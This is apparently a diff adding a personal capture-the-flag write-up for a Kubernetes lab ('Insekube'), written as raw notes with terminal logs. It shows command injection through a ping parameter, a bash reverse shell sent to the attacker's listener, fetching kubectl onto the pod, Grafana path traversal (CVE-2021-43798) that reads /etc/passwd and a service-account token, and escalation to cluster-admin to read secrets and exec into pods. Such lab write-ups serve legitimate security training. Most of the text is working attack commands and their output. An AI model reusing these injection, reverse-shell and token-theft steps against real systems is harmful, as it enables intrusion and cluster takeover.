@@ -464,3 +464,470 @@ curl 10.105.120.1:3000/login
         if (preloader.length) {
           preloader[0].className = "preloader preloader--done";
         }
+      }
+
+      
+      window.onload = function() {
+        if (window.__grafana_app_bundle_loaded) {
+          return;
+        }
+        window.__grafana_load_failed();
+      };
+
+      
+      </script><script nonce="" src="public/build/runtime.cb8720c05bfd4aaf3291.js"></script><script nonce="" src="public/build/3144.cb8720c05bfd4aaf3291.js"></script><script nonce="" src="public/build/4210.cb8720c05bfd4aaf3291.js"></script><script nonce="" src="public/build/8489.cb8720c05bfd4aaf3291.js"></script><script nonce="" src="public/build/6278.cb8720c05bfd4aaf3291.js"></script><script nonce="" src="public/build/6518.cb8720c05bfd4aaf3291.js"></script><script nonce="" src="public/build/app.cb8720c05bfd4aaf3291.js"></script><script nonce="">performance.mark('frontend_boot_js_done_time_seconds');</script></body></html>
+
+https://www.exploit-db.com/exploits/50581
+```
+What is the version of Grafana running on the machine?
+*8.3.0-beta2*
+What is the CVE you've found?
+*CVE-2021-43798*
+### Lateral Movement
+Kubernetes stores the token of the service account running a pod in `/var/run/secrets/kubernetes.io/serviceaccount/token`.
+Use the LFI vulnerability to extract the token. The token is a `JWT` signed by the cluster.
+Use the `--token` flag in `kubectl` to use the new service account. Once again use `kubectl` to check the permissions of this account.
+Insekube
+```shell-session
+challenge@syringe:/tmp$ ./kubectl auth can-i --list --token=${TOKEN}
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+*.*                                             []                                    []               [*]
+                                                [*]                                   []               [*]
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+                                                [/.well-known/openid-configuration]   []               [get]
+                                                [/api/*]                              []               [get]
+                                                [/api]                                []               [get]
+                                                [/apis/*]                             []               [get]
+                                                [/apis]                               []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/livez]                              []               [get]
+                                                [/livez]                              []               [get]
+                                                [/openapi/*]                          []               [get]
+                                                [/openapi]                            []               [get]
+                                                [/openid/v1/jwks]                     []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version]                            []               [get]
+                                                [/version]                            []               [get]
+```
+The account can do `*` verb on `*.*` resource. This means it is a `cluster-admin`. With this service account, you will be able to run any `kubectl` command. For example, try getting a list of pods.
+Insekube
+```shell-session
+challenge@syringe:/tmp$ ./kubectl get pods --token=${TOKEN}
+NAME                       READY   STATUS    RESTARTS       AGE
+grafana-57454c95cb-v4nrk   1/1     Running   10 (17d ago)   41d
+syringe-79b66d66d7-7mxhd   1/1     Running   1 (17d ago)    18d
+```
+Use `kubectl exec` to get a shell in the Grafana pod. You will find flag 3 in the environment variables.
+Insekube
+```shell-session
+challenge@syringe:/tmp$ ./kubectl exec -it grafana-57454c95cb-v4nrk --token=${TOKEN} -- /bin/bash
+Unable to use a TTY - input is not a terminal or the right kind of file
+hostname
+grafana-57454c95cb-v4nrk
+```
+Answer the questions below
+
+## Exploitation
+```text
+10.10.124.104/?hostname=10.8.19.103
+
+ING 10.8.19.103 (10.8.19.103) 56(84) bytes of data.
+64 bytes from 10.8.19.103: icmp_seq=1 ttl=61 time=207 ms
+64 bytes from 10.8.19.103: icmp_seq=2 ttl=61 time=202 ms
+
+--- 10.8.19.103 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1000ms
+rtt min/avg/max/mdev = 202.488/204.904/207.320/2.416 ms
+
+10.8.19.103;id
+
+PING 10.8.19.103 (10.8.19.103) 56(84) bytes of data.
+64 bytes from 10.8.19.103: icmp_seq=1 ttl=61 time=212 ms
+64 bytes from 10.8.19.103: icmp_seq=2 ttl=61 time=205 ms
+
+--- 10.8.19.103 ping statistics ---
+2 packets transmitted, 2 received, 0% packet loss, time 1002ms
+rtt min/avg/max/mdev = 205.403/208.551/211.700/3.148 ms
+uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
+
+revshell
+
+10.8.19.103;bash -i >& /dev/tcp/10.8.19.103/1337 0>&1
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1337
+listening on [any] 1337 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.124.104] 49662
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+challenge@syringe-79b66d66d7-6xdjz:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+<z:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+bash: python3: command not found
+
+/usr/bin/script -qc /bin/bash /dev/null
+
+challenge@syringe-79b66d66d7-6xdjz:~$ pwd
+pwd
+/home/challenge
+challenge@syringe-79b66d66d7-6xdjz:~$ cd /
+cd /
+challenge@syringe-79b66d66d7-6xdjz:/$ ls -lah
+ls -lah
+total 116M
+drwxr-xr-x   1 root root 4.0K Mar  3 23:26 .
+drwxr-xr-x   1 root root 4.0K Mar  3 23:26 ..
+-rwxr-xr-x   1 root root    0 Mar  3 23:26 .dockerenv
+lrwxrwxrwx   1 root root    7 Jan 19  2021 bin -> usr/bin
+drwxr-xr-x   2 root root 4.0K Apr 15  2020 boot
+drwxr-xr-x   5 root root  360 Mar  3 23:26 dev
+drwxr-xr-x   1 root root 4.0K Mar  3 23:26 etc
+-rw-r--r--   1 root root 116M Jan 19  2021 go1.15.7.linux-amd64.tar.gz
+drwxr-xr-x   1 root root 4.0K Jan  6  2022 home
+lrwxrwxrwx   1 root root    7 Jan 19  2021 lib -> usr/lib
+lrwxrwxrwx   1 root root    9 Jan 19  2021 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root    9 Jan 19  2021 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root   10 Jan 19  2021 libx32 -> usr/libx32
+drwxr-xr-x   2 root root 4.0K Jan 19  2021 media
+drwxr-xr-x   2 root root 4.0K Jan 19  2021 mnt
+drwxr-xr-x   2 root root 4.0K Jan 19  2021 opt
+dr-xr-xr-x 407 root root    0 Mar  3 23:26 proc
+drwx------   1 root root 4.0K Jan  7  2022 root
+drwxr-xr-x   1 root root 4.0K Mar  3 23:26 run
+lrwxrwxrwx   1 root root    8 Jan 19  2021 sbin -> usr/sbin
+drwxr-xr-x   2 root root 4.0K Jan 19  2021 srv
+dr-xr-xr-x  13 root root    0 Mar  3 23:26 sys
+drwxrwxrwt   1 root root 4.0K Jan  7  2022 tmp
+drwxr-xr-x   1 root root 4.0K Jan 19  2021 usr
+drwxr-xr-x   1 root root 4.0K Jan 19  2021 var
+
+challenge@syringe-79b66d66d7-6xdjz:/$ env
+env
+KUBERNETES_SERVICE_PORT_HTTPS=443
+GRAFANA_SERVICE_HOST=10.105.120.1
+KUBERNETES_SERVICE_PORT=443
+HOSTNAME=syringe-79b66d66d7-6xdjz
+SYRINGE_PORT=tcp://10.103.9.166:3000
+GRAFANA_PORT=tcp://10.105.120.1:3000
+SYRINGE_SERVICE_HOST=10.103.9.166
+SYRINGE_PORT_3000_TCP=tcp://10.103.9.166:3000
+GRAFANA_PORT_3000_TCP=tcp://10.105.120.1:3000
+PWD=/
+SYRINGE_PORT_3000_TCP_PROTO=tcp
+HOME=/home/challenge
+KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
+LS_COLORS=
+GOLANG_VERSION=1.15.7
+FLAG=flag{5e7cc6165f6c2058b11710a26691bb6b}
+SHLVL=2
+SYRINGE_PORT_3000_TCP_PORT=3000
+GRAFANA_PORT_3000_TCP_PORT=3000
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
+GRAFANA_SERVICE_PORT=3000
+SYRINGE_PORT_3000_TCP_ADDR=10.103.9.166
+SYRINGE_SERVICE_PORT=3000
+KUBERNETES_SERVICE_HOST=10.96.0.1
+KUBERNETES_PORT=tcp://10.96.0.1:443
+KUBERNETES_PORT_443_TCP_PORT=443
+GRAFANA_PORT_3000_TCP_PROTO=tcp
+PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+OLDPWD=/home/challenge
+GRAFANA_PORT_3000_TCP_ADDR=10.105.120.1
+_=/usr/bin/env
+```
+![[Pasted image 20230303183254.png]]
+What is flag 1?
+### Interacting with kubernetes
+Kubernetes exposes an HTTP API to control the cluster. All resources in the cluster can be accessed and modified through this API. The easiest way to interact with the API is to use the `kubectl` CLI. You could also interact with the API directly using `curl` or `wget` if you don't have write access and `kubectl` is not already present, Here is a [good article](https://nieldw.medium.com/curling-the-kubernetes-api-server-d7675cfc398c) on that.
+The `kubectl` install instructions can be found [here](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux). However, the binary is located in the `/tmp` directory. In the event you run into a scenario where the binary is not available, it's as simple as [downloading the binary](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) to your machine and serving it (with a python HTTP server for example) so it is accessible from the container.
+Now let's move to the `/tmp` directory where the `kubectl`  is conveniently located for you and try the `kubectl get pods` command. You'll notice a  forbidden error which means the service account running this pod does not have enough permissions.
+Insekube
+```shell-session
+challenge@syringe:~$ cd /tmp
+
+challenge@syringe:/tmp$ ls -la
+total 45504
+drwxrwxrwt 1 root root     4096 Jan 30 19:56 .
+drwxr-xr-x 1 root root     4096 Feb 17 20:03 ..
+-rwxrwxr-x 1 root root 46587904 Jan 30 19:17 kubectl
+
+challenge@syringe:/tmp$ ./kubectl get pods
+Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:syringe" cannot list resource "pods" in API group "" in the namespace "default"
+```
+You can check your permissions using `kubectl auth can-i --list`. The results show this service account can list and get secrets in this namespace.
+Insekube
+```shell-session
+challenge@syringe:/tmp$ ./kubectl auth can-i --list
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+secrets                                         []                                    []               [get list]
+                                                [/.well-known/openid-configuration]   []               [get]
+                                                [/api/*]                              []               [get]
+                                                [/api]                                []               [get]
+                                                [/apis/*]                             []               [get]
+                                                [/apis]                               []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/livez]                              []               [get]
+                                                [/livez]                              []               [get]
+                                                [/openapi/*]                          []               [get]
+                                                [/openapi]                            []               [get]
+                                                [/openid/v1/jwks]                     []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version]                            []               [get]
+                                                [/version]                            []               [get]
+```
+Answer the questions below
+```text
+┌──(witty㉿kali)-[~/Downloads]
+└─$ curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ls -la kubectl 
+-rw-r--r-- 1 witty witty 48029696 Mar  3 18:42 kubectl
+
+challenge@syringe-79b66d66d7-6xdjz:/$ find / -name "kubectl"
+find / -name "kubectl"
+find: '/etc/ssl/private': Permission denied
+find: '/var/lib/apt/lists/partial': Permission denied
+find: '/var/cache/apt/archives/partial': Permission denied
+find: '/var/cache/ldconfig': Permission denied
+find: '/proc/tty/driver': Permission denied
+find: '/root': Permission denied
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.124.104 - - [03/Mar/2023 18:54:56] "GET /kubectl HTTP/1.1" 200 -
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ cd /tmp
+cd /tmp
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ wget http://10.8.19.103:1234/kubectl
+wget http://10.8.19.103:1234/kubectl
+--2023-03-03 23:54:55--  http://10.8.19.103:1234/kubectl
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 48029696 (46M) [application/octet-stream]
+Saving to: 'kubectl'
+
+     0K .......... .......... .......... .......... ..........  0%  120K 6m32s
+    50K .......... .......... .......... .......... ..........  0%  242K 4m52s
+   100K .......... .......... .......... .......... ..........  0% 2.23M 3m22s
+
+ 46850K .......... .......... .......... .......... .......... 99% 5.94M 0s
+ 46900K ....                                                  100% 13.1M=24s
+
+2023-03-03 23:55:20 (1.90 MB/s) - 'kubectl' saved [48029696/48029696]
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ chmod +x kubectl
+chmod +x kubectl
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get pods
+./kubectl get pods
+Error from server (Forbidden): pods is forbidden: User "system:serviceaccount:default:syringe" cannot list resource "pods" in API group "" in the namespace "default"
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl auth can-i create pods
+./kubectl auth can-i create pods
+no
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl auth can-i --list
+./kubectl auth can-i --list
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+secrets                                         []                                    []               [get list]
+                                                [/.well-known/openid-configuration]   []               [get]
+                                                [/api/*]                              []               [get]
+                                                [/api]                                []               [get]
+                                                [/apis/*]                             []               [get]
+                                                [/apis]                               []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/livez]                              []               [get]
+                                                [/livez]                              []               [get]
+                                                [/openapi/*]                          []               [get]
+                                                [/openapi]                            []               [get]
+                                                [/openid/v1/jwks]                     []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version]                            []               [get]
+                                                [/version]                            []
+```
+No answer needed
+Completed
+### Kubernetes Secrets
+Kubernetes stores secret values in resources called Secrets these then get mounted into pods either as environment variables or files.
+You can use `kubectl` to list and get secrets. The content of the secret is stored base64 encoded.
+You will find flag 2 in a Kubernetes secret.
+Insekube
+```shell-session
+challenge@syringe:/tmp$ ./kubectl get secrets
+NAME                    TYPE                                  DATA   AGE
+default-token-8bksk     kubernetes.io/service-account-token   3      41d
+developer-token-74lck   kubernetes.io/service-account-token   3      41d
+secretflag              Opaque                                1      41d
+syringe-token-g85mg     kubernetes.io/service-account-token   3      41d
+```
+Use `kubectl describe secret secretflag` to list all data contained in the secret. Notice the flag data isn't being outputted with this command, so let's choose the JSON output format with: `kubectl get secret secretflag -o 'json'`
+Answer the questions below
+```text
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get secrets
+./kubectl get secrets
+NAME                    TYPE                                  DATA   AGE
+default-token-8q4vp     kubernetes.io/service-account-token   3      24h
+developer-token-rnmqz   kubernetes.io/service-account-token   3      24h
+secretflag              Opaque                                1      24h
+syringe-token-6w8tq     kubernetes.io/service-account-token   3      24h
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl describe secret secretflag
+./kubectl describe secret secretflag
+Name:         secretflag
+Namespace:    default
+Labels:       <none>
+Annotations:  <none>
+
+Type:  Opaque
+
+Data
+====
+flag:  38 bytes
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get secret secretflag -o 'json'
+<djz:/tmp$ ./kubectl get secret secretflag -o 'json'
+{
+    "apiVersion": "v1",
+    "data": {
+        "flag": "ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0="
+    },
+    "kind": "Secret",
+    "metadata": {
+        "annotations": {
+            "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"data\":{\"flag\":\"ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=\"},\"kind\":\"Secret\",\"metadata\":{\"annotations\":{},\"name\":\"secretflag\",\"namespace\":\"default\"},\"type\":\"Opaque\"}\n"
+        },
+        "creationTimestamp": "2023-03-02T23:51:30Z",
+        "name": "secretflag",
+        "namespace": "default",
+        "resourceVersion": "819",
+        "uid": "f341b287-9f62-41c2-9eac-4d1a27ad76dc"
+    },
+    "type": "Opaque"
+}
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ echo 'ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=' | base64 -d
+flag{df2a636de15108a4dc41135d930d8ec1}
+```
+What is flag 2?
+```text
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ curl --path-as-is http://10.105.120.1:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd
+</alertlist/../../../../../../../../../../etc/passwd
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1230  100  1230    0     0   240k      0 --:--:-- --:--:-- --:--:--  240k
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
+
+or
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ curl --path-as-is 10.105.120.1:3000/public/plugins/alertGroups/../../../../../../../../etc/passwd
+<gins/alertGroups/../../../../../../../../etc/passwd
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1230  100  1230    0     0   600k      0 --:--:-- --:--:-- --:--:-- 1201k
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+grafana:x:472:0:Linux User,,,:/home/grafana:/sbin/nologin
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ curl --path-as-is 10.105.120.1:3000/public/plugins/alertGroups/../../../../../../../../var/run/secrets/kubernetes.io/serviceaccount/token
+</var/run/secrets/kubernetes.io/serviceaccount/token
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  1022  100  1022    0     0   499k      0 --:--:-- --:--:-- --:--:--  499k
+eyJhbGciOiJSUzI1NiIsImtpZCI6IkpwcUhIZ1hyRF9FbGYyQ1piWHNiemZhNGpnSTl0Z3Z1X2dMeFAtTURUaVUifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzA5NDI0OTA4LCJpYXQiOjE2Nzc4ODg5MDgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItZjlqczUiLCJ1aWQiOiI4N2RiNDhiMC1kMTc2LTQyOGMtOWZhNS0yZDVkMzlmMjU4NjcifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6ImIwMWIwODc5LWNlMDItNDAxNC1iNjEyLTEyOWVlYzAxNjdiNCJ9LCJ3YXJuYWZ0ZXIiOjE2Nzc4OTI1MTV9LCJuYmYiOjE2Nzc4ODg5MDgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.BXeI8ejqdRieINmEmHnFHj8navP0zIQ0CPebkTxEgv1AEgzIkhunEbg8xg1BefyjJXMryqo60SJaR6y4fcd3fx7ocfbF5hh3M2QfQpeR4iQVv4g-pJ7z3thd47W2DKQp9_xDMCglIUeJx07L8aJErHJwII9qvK_A7yWC6a6G6nfumsrE5TWSf9ldXUyF4TmJEb5rcALOXiCbFpD488Onb-I4oLouDgQuV8XGYz2WExTGIb42YquIWaTrZMHZ8LrEDpXbiHPKRy4_QE2F7q1UVIJaJJsA3cUqpt2dO0yVLHD19mvoW_MMXBlWTTU-wohIf1ORI8NYENXPnE14dDroFgc
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ export TOKEN=eyJhbGciOiJSUzI1NiIsImtpZCI6IkpwcUhIZ1hyRF9FbGYyQ1piWHNiemZhNGpnSTl0Z3Z1X2dMeFAtTURUaVUifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNzA5NDI0OTA4LCJpYXQiOjE2Nzc4ODg5MDgsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJncmFmYW5hLTU3NDU0Yzk1Y2ItZjlqczUiLCJ1aWQiOiI4N2RiNDhiMC1kMTc2LTQyOGMtOWZhNS0yZDVkMzlmMjU4NjcifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRldmVsb3BlciIsInVpZCI6ImIwMWIwODc5LWNlMDItNDAxNC1iNjEyLTEyOWVlYzAxNjdiNCJ9LCJ3YXJuYWZ0ZXIiOjE2Nzc4OTI1MTV9LCJuYmYiOjE2Nzc4ODg5MDgsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRldmVsb3BlciJ9.BXeI8ejqdRieINmEmHnFHj8navP0zIQ0CPebkTxEgv1AEgzIkhunEbg8xg1BefyjJXMryqo60SJaR6y4fcd3fx7ocfbF5hh3M2QfQpeR4iQVv4g-pJ7z3thd47W2DKQp9_xDMCglIUeJx07L8aJErHJwII9qvK_A7yWC6a6G6nfumsrE5TWSf9ldXUyF4TmJEb5rcALOXiCbFpD488Onb-I4oLouDgQuV8XGYz2WExTGIb42YquIWaTrZMHZ8LrEDpXbiHPKRy4_QE2F7q1UVIJaJJsA3cUqpt2dO0yVLHD19mvoW_MMXBlWTTU-wohIf1ORI8NYENXPnE14dDroFgc
+<O0yVLHD19mvoW_MMXBlWTTU-wohIf1ORI8NYENXPnE14dDroFgc
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl auth can-i --list --token=$TOKEN
+<jz:/tmp$ ./kubectl auth can-i --list --token=$TOKEN
+Resources                                       Non-Resource URLs                     Resource Names   Verbs
+*.*                                             []                                    []               [*]
+                                                [*]                                   []               [*]
+selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
+selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
+                                                [/.well-known/openid-configuration]   []               [get]
+                                                [/api/*]                              []               [get]
+                                                [/api]                                []               [get]
+                                                [/apis/*]                             []               [get]
+                                                [/apis]                               []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/healthz]                            []               [get]
+                                                [/livez]                              []               [get]
+                                                [/livez]                              []               [get]
+                                                [/openapi/*]                          []               [get]
+                                                [/openapi]                            []               [get]
+                                                [/openid/v1/jwks]                     []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/readyz]                             []               [get]
+                                                [/version/]                           []               [get]
